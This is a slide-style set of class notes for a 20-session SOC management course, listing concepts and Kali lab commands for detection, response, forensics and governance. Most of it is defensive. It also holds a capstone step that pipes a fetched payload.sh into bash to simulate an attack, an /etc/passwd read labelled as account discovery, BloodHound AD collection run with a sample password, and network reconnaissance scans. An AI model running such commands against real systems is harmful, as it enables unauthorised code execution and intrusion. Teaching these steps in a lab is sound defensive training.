---
marp: true
paginate: true
theme: default
class: invert
title: SOC Management & Operations — Class-by-Class Field Notes
description: Slide-style detailed notes for all 20 sessions (concepts, labs, Kali commands).
---

<style>
section {
  font-size: 21px;
  background: #0c111a;
  color: #e7edf5;
}
section.lead { text-align: left; }
h1 { color: #ffb84d; font-size: 46px; }
h2 { color: #ffb84d; border-bottom: 2px solid #26303f; padding-bottom: 6px; }
h3 { color: #93a1b3; text-transform: uppercase; letter-spacing: .08em; font-size: 15px; margin-bottom: 4px; }
strong { color: #ffd9a0; }
blockquote { border-left: 4px solid #ffb84d; color: #cdd7e3; background: #131b28; padding: 8px 16px; }
code { background: #131b28; color: #ffd9a0; }
pre { background: #0f1621; border: 1px solid #26303f; }
a { color: #ffb84d; }
table { font-size: 18px; }
</style>

<!-- _class: lead invert -->

# SOC Management & Operations
## Class-by-Class Field Notes · Sessions 01–20

Concepts · Lab focus · Copy-paste Kali commands

**Format:** 20 sessions × 3 hours · 7:30–9:30 PM
**Platforms:** Kali Linux · Wazuh · Microsoft Sentinel
**Class link:** `https://meet.google.com/fhv-mrjw-zzh`

---

## Course Map

| # | Session | Phase |
|---|---------|-------|
| 01 | SOC Operations & Architecture | **Foundations** |
| 02 | Strategy, Operating Models & Maturity | Foundations |
| 03 | Team, Shifts, SLA & KPI | Foundations |
| 04 | Threat Landscape, ATT&CK & Intel | **Threat & Detection** |
| 05 | Monitoring, Correlation & Detection Strategy | Threat & Detection |
| 06 | SIEM Architecture & Detection Engineering | Threat & Detection |
| 07 | Detection, Triage & Case Management | **Incident & Forensics** |
| 08 | Incident Response (NIST) & Playbooks | Incident & Forensics |
| 09 | Digital Forensics & Malware Investigation | Incident & Forensics |
| 10 | Vulnerability & Patch Management | **Risk, Hunt & Controls** |

---

## Course Map (cont.)

| # | Session | Phase |
|---|---------|-------|
| 11 | Threat Hunting & IOC Management | Risk, Hunt & Controls |
| 12 | Security Controls: EDR/XDR/WAF/SOAR | Risk, Hunt & Controls |
| 13 | Metrics, KPI, KRI & Reporting | **Metrics, Compliance & Continuity** |
| 14 | Compliance & Regulatory Frameworks | Metrics, Compliance & Continuity |
| 15 | Business Continuity & Disaster Recovery | Metrics, Compliance & Continuity |
| 16 | Governance, Policies, SOPs & Runbooks | **Governance, Automation & Audit** |
| 17 | Automation, SOAR & AI for SOC | Governance, Automation & Audit |
| 18 | Auditing, Vendor & Third-Party Risk | Governance, Automation & Audit |
| 19 | Exec Communication, Budget & Roadmap | **Leadership & Capstone** |
| 20 | Capstone: End-to-End SOC Simulation | Leadership & Capstone |

---

## 01 · Introduction to Cyber Security Operations & SOC Architecture

`Session 01` · 3-hour session · **Lab:** Kali sensor prep, asset discovery

### Concept & theory
- A SOC is **people + process + technology** delivering continuous monitoring, detection, and response.
- Core functions: log collection, real-time monitoring, alert triage, incident response, threat intel, reporting.
- Architecture tiers: **data sources → collection/forwarding → SIEM/analytics → case management → response & automation**.
- Sensor placement: network TAP/SPAN at perimeter and core, host agents (EDR), cloud API feeds.
- Delivery models: in-house, MSSP / co-managed, hybrid, virtual SOC.

### Key commands
```bash
sudo ip link set eth0 promisc on          # enable SPAN/mirror capture
sudo arp-scan --interface=eth0 --localnet  # layer-2 asset sweep
nmap -sn 192.168.1.0/24 -oN hosts.txt      # ICMP ping sweep
sudo tcpdump -i eth0 -nn -c 20             # verify TAP is receiving traffic
```

> **Takeaway:** You can't monitor what you can't see — visibility and asset inventory come before detection.

---

## 02 · SOC Strategy, Operating Models, Service Catalog & Maturity Model

`Session 02` · 3-hour session · **Lab:** Attack-surface & service cataloging

### Concept & theory
- Strategy aligns monitoring scope to **business risk**, crown-jewel assets, and compliance drivers.
- Operating models: 8×5, 16×5, 24×7 follow-the-sun; build vs buy vs hybrid.
- **Service catalog** defines each deliverable (monitoring, IR, hunting, TI, VM, reporting) with scope, SLA, RACI.
- Maturity models: **SOC-CMM**, levels 0–5 across people / process / technology / services.
- A capability assessment produces a prioritized gap-closure roadmap.

### Key commands
```bash
nmap -sS -sV -O -p- --open -T4 192.168.1.50 -oA asset_catalog
whatweb -v https://target.local          # web tech / CMS fingerprint
wafw00f https://target.local             # detect WAF in front of asset
snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.1
```

> **Takeaway:** Maturity is measured, not claimed — assess before you invest.

---

## 03 · Building & Managing a SOC Team, Shift Management, SLA & KPI

`Session 03` · 3-hour session · **Lab:** Shift handover recording, auth auditing

### Concept & theory
- Roles: **L1 triage, L2 investigation, L3 hunt/DFIR**, detection engineer, TI analyst, SOC manager.
- Shift design: coverage, structured handover, fatigue/burnout management, on-call rotation.
- **SLA**: time-to-acknowledge, time-to-triage, time-to-contain — differentiated by severity.
- **KPI / KRI**: alert volume, false-positive rate, MTTD, MTTR, dwell time, escalation rate.
- Career pathing and rotation reduce analyst churn.

### Key commands
```bash
script -a -t=2>shift_timing.log shift_session.log   # record terminal session
scriptreplay shift_timing.log shift_session.log     # replay for QA/training
last -a -F | head -n 20                             # analyst login history
sudo journalctl -u ssh -S today | grep -i "failed password"
```

> **Takeaway:** A SOC runs on documented handovers and measurable SLAs, not heroics.

---

## 04 · Cyber Threat Landscape, MITRE ATT&CK, Kill Chain & Threat Intelligence

`Session 04` · 06 Aug 2026 · **Lab:** ATT&CK Navigator, STIX/TAXII feeds

### Concept & theory
- Threat actors — nation-state, organized crime, hacktivist, insider — differ in motive, resources, patience.
- **Cyber Kill Chain:** recon → weaponize → deliver → exploit → install → C2 → actions on objectives.
- **MITRE ATT&CK:** tactics (why) × techniques (how) — a shared language for detection coverage.
- TI tiers: strategic / operational / tactical; IOCs vs TTPs (**pyramid of pain**).
- Intel lifecycle: direction → collection → processing → analysis → dissemination → feedback.

### Key commands
```bash
docker run -d --name navigator -p 4200:4200 bodane/attack-navigator:latest
pip install stix2 taxii2-client --break-system-packages
uname -a && hostname                    # T1082 System Information Discovery
cat /etc/passwd | cut -d: -f1,3,7       # T1087.001 Local Account Discovery
```

> **Takeaway:** Map detections to ATT&CK to expose coverage gaps before an adversary does.

---

## 05 · Security Monitoring, Event Correlation, Log Management & Detection Strategy

`Session 05` · 09 Aug 2026 · **Lab:** Suricata, Zeek, auditd, osquery

### Concept & theory
- Log pipeline: **collect → parse/normalize → enrich → index → retain**.
- Detection strategy: signature vs anomaly vs behavioral; alert fidelity and the detection funnel.
- **Correlation** links events across sources by time, entity, and sequence to build a narrative.
- Source priority: authentication, endpoint/process, network, DNS, proxy, cloud audit.
- Detection-as-code with a feedback loop back into engineering.

### Key commands
```bash
sudo suricata-update && sudo suricata -c /etc/suricata/suricata.yaml -i eth0 -D
sudo zeek -i eth0 local                                  # structured conn/dns/http logs
sudo auditctl -w /etc/shadow -p wa -k shadow_tamper      # file integrity watch
osqueryi "SELECT pid,name,cmdline FROM processes WHERE name LIKE '%nc%';"
```

> **Takeaway:** Good detection starts with the right logs, normalized and retained — tooling is secondary.

---

## 06 · SIEM Architecture, Use Cases, Detection Engineering & Alert Tuning

`Session 06` · 16 Aug 2026 · **Lab:** Wazuh, Sigma CLI, Chainsaw, wazuh-logtest

### Concept & theory
- SIEM components: forwarders → ingest pipeline → indexer/store → correlation engine → dashboards → alerting.
- Sizing: **EPS / GB-per-day**, hot/warm/cold storage, retention vs cost.
- Use-case lifecycle: hypothesis → data check → rule → test → deploy → **tune → retire**.
- **Sigma** = portable detection, converted to backend queries (KQL, SPL, EQL, Lucene).
- Alert tuning: allowlists, thresholds, aggregation, suppression → less false positive fatigue.

### Key commands
```bash
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash wazuh-install.sh -a
sigma convert -t elasticsearch-lucene -p ecs_windows rule.yml
./chainsaw hunt ./evtx/ -s sigma/rules/ --mapping mappings/sigma-event-logs-all.yml
sudo /var/ossec/bin/wazuh-logtest        # test raw logs against rules
```

> **Takeaway:** A noisy SIEM is worse than none — every rule needs an owner and a tuning plan.

---

## 07 · Incident Detection, Triage, Prioritization & Case Management

`Session 07` · 18 Aug 2026 · **Lab:** IOC extraction, VirusTotal, TheHive / Cortex

### Concept & theory
- **Triage in minutes:** is it real? how bad? what's the scope? what next?
- Priority matrix: **impact × urgency**, weighted by asset criticality and data sensitivity.
- Enrichment: reputation, geo, asset owner, user context, prior history.
- Case management: ticket, timeline, evidence, chain of custody, status, metrics.
- Deduplicate and link related alerts into a single incident.

### Key commands
```bash
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/syslog | sort -u   # IPv4 IOCs
grep -oE '\b[a-fA-F0-9]{64}\b' incident_note.txt                       # SHA256 IOCs
vt ip 185.220.101.5                                                    # VirusTotal enrich
docker run -d --name thehive -p 9000:9000 thehiveproject/thehive:latest
```

> **Takeaway:** Consistent triage criteria make prioritization fast and defensible.

---

## 08 · Incident Response Framework (NIST), Playbooks, Escalation & Communication

`Session 08` · 20 Aug 2026 · **Lab:** Live containment, Volatility 3 memory forensics

### Concept & theory
- **NIST SP 800-61r2:** Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident.
- Containment: short-term isolation vs long-term fix — **preserve evidence first**.
- Playbooks per scenario (phishing, ransomware, account compromise, C2) with decision points.
- **Escalation matrix:** who is notified at each severity — legal, PR, exec, regulators.
- Communication: incident bridge, status cadence, regulatory notification obligations.

### Key commands
```bash
sudo iptables -P INPUT DROP; sudo iptables -A INPUT -s 192.168.1.100 -p tcp --dport 22 -j ACCEPT
sudo ss -K dst 198.51.100.23 dport = 4444     # sever active C2 connection
sudo kill -9 <malicious_pid>
python3 vol.py -f memdump.raw windows.pstree   # process tree from memory image
```

> **Takeaway:** Rehearsed playbooks and a clear escalation matrix cut response time when it matters.

---

## 09 · Digital Forensics Overview, Evidence Handling & Malware Investigation

`Session 09` · 23 Aug 2026 · **Lab:** dc3dd imaging, Autopsy, YARA, oletools

### Concept & theory
- Principles: **order of volatility**, write-blocking, hashing, chain of custody, documentation.
- Acquisition types: disk (bit-stream image), memory, network, cloud/log.
- Analysis: timeline, filesystem artifacts, registry/prefetch, browser, deleted-file recovery.
- Malware triage: **static** (strings, headers, imports, YARA) vs **dynamic** (sandbox behavior).
- Reports must be reproducible, factual, and defensible in court.

### Key commands
```bash
sudo dc3dd if=/dev/sdb of=evidence.raw hash=sha256 log=imaging_log.txt
mmls evidence.raw && fls -r -d -p -o 2048 evidence.raw    # partitions + deleted files
yara -r /usr/share/yara/rules/malware_rules.yar sample.bin
olevba invoice_phishing.docm                              # malicious macro analysis
```

> **Takeaway:** Evidence integrity is everything — hash first, work on copies, document every step.

---

## 10 · Vulnerability Management, Risk Assessment & Patch Management

`Session 10` · 27 Aug 2026 · **Lab:** Nuclei, Nikto, Lynis, Trivy (+ Nessus/OpenVAS)

### Concept & theory
- VM lifecycle: **discover → scan → prioritize → remediate → verify → report** — continuous, not annual.
- Prioritize by **CVSS + exploitability (EPSS, CISA KEV) + asset context**, not raw CVE count.
- Risk assessment: likelihood × impact; accept / mitigate / transfer.
- Patch management: test → stage → deploy → rollback; emergency vs scheduled cycles.
- Metrics: mean time to remediate, scan coverage, recurrence rate, SLA compliance by severity.

### Key commands
```bash
nuclei -update-templates && nuclei -u https://target.lab -severity critical,high
nikto -h http://192.168.1.50 -C all -Format htm -output nikto_report.html
sudo lynis audit system --quick                 # host hardening audit
trivy image nginx:latest                        # container / SCA vuln scan
```

> **Takeaway:** Rank by real-world exploitability and business impact, not by the size of the report.

---

## 11 · Threat Hunting Strategy, IOC Management & Threat Intel Integration

`Session 11` · 30 Aug 2026 · **Lab:** MISP, YARA hunting, AlienVault OTX

### Concept & theory
- Hunting is **hypothesis-driven and proactive** — assume a breach has evaded controls.
- Hypotheses come from: threat intel, ATT&CK gaps, anomalies, crown-jewel risk.
- Hunt loop: hypothesis → data → analysis → finding → **new detection** (feeds the SIEM).
- IOC management: lifecycle, confidence scoring, aging/expiry, source, sharing (MISP / STIX).
- TI integration: automated feed ingestion, enrichment, and watchlists in the SIEM.

### Key commands
```bash
git clone https://github.com/MISP/misp-docker.git && cd misp-docker && sudo docker-compose up -d
yara -r hunt_webshell.yar /var/www/html/          # proactive webshell hunt
pip install OTXv2 --break-system-packages
# OTXv2: otx.get_indicator_details_full('IPv4', '185.220.101.5')
```

> **Takeaway:** Every successful hunt should end as a new automated detection.

---

## 12 · Security Controls: EDR, XDR, Firewall, WAF, IDS/IPS, SOAR & SIEM Integration

`Session 12` · 03 Sep 2026 · **Lab:** nftables, fail2ban, Wazuh Active Response

### Concept & theory
- **Defense-in-depth:** layered network, host, application, identity, and data controls.
- **EDR vs XDR:** endpoint telemetry & response vs cross-domain correlated detection & response.
- Prevention (firewall / WAF / IPS) blocks; detection (IDS / EDR / SIEM) alerts; **SOAR** orchestrates.
- Control integration: everything feeds the SIEM; SOAR pushes actions back (block, isolate, disable).
- Ongoing tuning keeps controls effective without breaking the business.

### Key commands
```bash
sudo nft add rule inet filter input ct state established,related accept
sudo fail2ban-client status sshd
sudo fail2ban-client set sshd banip 198.51.100.50
sudo /var/ossec/active-response/bin/firewall-drop.sh add - 198.51.100.50 1620000000 01
```

> **Takeaway:** Controls only add value when integrated — isolated tools create blind spots and manual work.

---

## 13 · SOC Metrics, KPI, KRI, Dashboards & Executive Reporting

`Session 13` · 06 Sep 2026 · **Lab:** Python MTTD/MTTR, EPS calc (+ Power BI / Excel)

### Concept & theory
- **Operational** metrics (alert volume, FP rate, MTTD, MTTR, dwell) vs **executive** metrics (risk reduction, coverage, ROI).
- KPI = performance; **KRI** = risk-exposure early warning.
- Dashboard design: audience-specific, trend over snapshot, actionable not vanity.
- Reporting cadence: daily ops → weekly SOC → monthly management → quarterly board.
- Tie every metric to a business outcome and budget justification.

### Key commands
```bash
python3 soc_metrics.py          # MTTD / MTTR from incident JSON records
START=$(wc -l < /var/log/syslog); sleep 10; END=$(wc -l < /var/log/syslog)
echo "EPS: $(( (END - START) / 10 ))"
```

> **Takeaway:** Report the story the numbers tell — risk reduced and time saved — not raw counts.

---

## 14 · Compliance & Regulatory Frameworks (ISO 27001, NIST CSF, PCI DSS, GDPR, CIS)

`Session 14` · 3-hour session · **Lab:** OpenSCAP, testssl.sh, Checkov

### Concept & theory
- Frameworks: **ISO/IEC 27001** (ISMS), **NIST CSF** (Identify/Protect/Detect/Respond/Recover), **PCI DSS** (cardholder data), **GDPR** (privacy), **CIS Controls** (prioritized safeguards).
- Compliance ≠ security, but it maps SOC capabilities to auditable requirements.
- Build a **control crosswalk** — one control satisfies many frameworks.
- Evidence: logs, retention, access reviews, and monitoring proof for audits.
- Continuous compliance via automated configuration and benchmark scanning.

### Key commands
```bash
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \
  --report cis_report.html /usr/share/xml/scap/ssg/content/ssg-debian12-ds.xml
./testssl.sh --pci --warnings batch https://target.local
checkov -d /opt/soc-infrastructure/           # IaC CIS/NIST compliance
```

> **Takeaway:** A single control crosswalk turns many audits into one evidence set.

---

## 15 · Business Continuity, Disaster Recovery & Cyber Crisis Management

`Session 15` · 3-hour session · **Lab:** Restic immutable backups, rsync DR sync

### Concept & theory
- **BIA** sets RTO/RPO per critical service; BCP keeps the business running, **DR** restores IT.
- Cyber crisis management: activation criteria, crisis team, decision authority, comms tree.
- Backup strategy: **3-2-1**, immutability / air-gap against ransomware, tested restores.
- Scenario planning: ransomware, data destruction, prolonged outage, loss of SOC tooling.
- Exercises: tabletop → functional → full failover; lessons learned feed the plan.

### Key commands
```bash
restic init --repo /backup/soc_repo
restic -r /backup/soc_repo backup /etc/suricata /var/ossec/etc /etc/elasticsearch
restic -r /backup/soc_repo check                       # verify snapshot integrity
rsync -avzhe ssh --delete /evidence/ soc-dr@192.168.10.50:/remote_dr_backup/evidence/
```

> **Takeaway:** An untested backup is a hope, not a recovery plan.

---

## 16 · SOC Governance, Policies, SOPs, Playbooks & Runbooks

`Session 16` · 3-hour session · **Lab:** Ansible containment runbook, Pandoc SOP export

### Concept & theory
- Governance hierarchy: **policy (why) → standard (what) → SOP (how) → runbook (step-by-step)**.
- Playbook vs runbook: decision workflow vs exact executable steps.
- Version control, review cycles, ownership, and approval for all SOC documentation.
- Policy set: monitoring, data handling, evidence, escalation, acceptable use, retention.
- **Documentation as code:** Git-managed, peer-reviewed, tested.

### Key commands
```bash
ansible-playbook soc_containment_runbook.yml \
  --extra-vars "target_c2_ip=203.0.113.50 compromised_user=john_doe"
pandoc class-4-command.md -o SOP_Threat_Intel.pdf --pdf-engine=weasyprint
```

> **Takeaway:** If it isn't written down and version-controlled, it isn't a process.

---

## 17 · SOC Automation, SOAR, AI for SOC & Detection Optimization

`Session 17` · 3-hour session · **Lab:** Shuffle SOAR, Ollama LLM triage (+ Sentinel automation)

### Concept & theory
- **SOAR:** playbook automation + case management + integrations — automate the repetitive, keep humans on decisions.
- Automation candidates: enrichment, triage, high-confidence containment, ticketing.
- AI/ML in the SOC: alert clustering, anomaly detection, LLM-assisted triage and summarization.
- Detection optimization: measure rule precision/recall, retire dead rules, close ATT&CK gaps.
- Guardrails: human-in-the-loop for destructive actions, audit trails, rollback.

### Key commands
```bash
git clone https://github.com/Shuffle/Shuffle.git && cd Shuffle && sudo docker-compose up -d
curl -fsSL https://ollama.com/install.sh | sh && ollama run mistral
python3 ask_soc_ai.py            # pipe SIEM alert -> LLM -> MITRE mapping + steps
```

> **Takeaway:** Automate to give analysts time back — not to remove judgment from the loop.

---

## 18 · SOC Auditing, Vendor Management & Third-Party Risk Review

`Session 18` · 3-hour session · **Lab:** BloodHound AD audit, TruffleHog secret scanning

### Concept & theory
- SOC audit scope: process conformance, detection coverage, SLA adherence, tooling health, purple-team validation.
- **Third-party risk:** assess vendor posture, access, and data exposure (SIG / SOC 2 / ISO evidence).
- Supply-chain risk: software dependencies, MSSP access, integration credentials.
- Continuously monitor vendor access and leaked-secret exposure.
- Audit output: findings → risk ratings → remediation plan → re-test.

### Key commands
```bash
bloodhound-python -u 'AuditUser' -p 'Password123' -d corporate.local \
  -ns 192.168.1.10 -c All                       # ingest AD attack paths
trufflehog git https://github.com/vendor/integration-app.git
```

> **Takeaway:** Your risk includes every vendor with access — audit them like your own environment.

---

## 19 · Executive Communication, Budget Planning, Resource Management & SOC Roadmap

`Session 19` · 3-hour session · **Lab:** matplotlib executive charts, EPS license forecasting

### Concept & theory
- Speak **business** — risk, cost, and outcomes — not packet captures and rule IDs.
- Budget lines: headcount, tooling/licensing (EPS-driven), training, retained IR; capex vs opex.
- Business cases quantify risk reduced, time saved, incidents prevented, compliance met.
- **Roadmap:** current maturity → target state → prioritized initiatives over 12–36 months.
- Resource management: capacity planning, coverage vs cost, outsourcing trade-offs.

### Key commands
```bash
pip install matplotlib --break-system-packages
python3 executive_chart.py       # dual-axis: total incidents vs MTTD trend -> PNG
```

> **Takeaway:** Funding follows a clear line from spend to risk reduced — draw it every time.

---

## 20 · End-to-End SOC Capstone, Leadership Simulation & Decision-Making Exercise

`Session 20` · 3-hour session · **Lab:** Full incident lifecycle on Kali

### Concept & theory
- Run the **full loop under time pressure:** simulate → detect → triage → contain → acquire evidence → eradicate → recover → report.
- Incident command: roles, tempo, decision logs, communication cadence.
- Decision-making under uncertainty: containment trade-offs, business impact, when to escalate.
- After-action review: root cause, timeline, what worked, corrective actions, new detections.
- Bring people + process + technology together as one operation.

### Key commands
```bash
bash -c "curl -s http://127.0.0.1:8080/payload.sh | bash"   # 1. simulate (T1059)
sudo ausearch -m EXECVE -ts recent | tail -n 15             # 2. detect
sha256sum /tmp/payload.sh                                   # 3. triage / hash
sudo iptables -A OUTPUT -d 198.51.100.23 -j DROP            # 4. contain egress
sudo dc3dd if=/tmp/payload.sh of=evidence.raw hash=sha256   # 5. acquire evidence
```

> **Takeaway:** A SOC is judged on the full loop — detection means nothing without contained, documented recovery.

---

<!-- _class: lead invert -->

# The Course Arc

**Foundations (01–03)** — what a SOC is, how it's structured, staffed, and measured.
**Threat & Detection (04–06)** — the adversary, the detection strategy, the SIEM that runs it.
**Incident & Forensics (07–09)** — triage, NIST response, evidence and malware analysis.
**Risk, Hunt & Controls (10–12)** — vulnerabilities, proactive hunting, layered controls.
**Metrics, Compliance & Continuity (13–15)** — proving value, meeting frameworks, surviving crises.
**Governance, Automation & Audit (16–18)** — documented process, SOAR/AI, third-party risk.
**Leadership & Capstone (19–20)** — talking to executives, then running the whole loop live.

> Detection means nothing without contained, documented recovery.
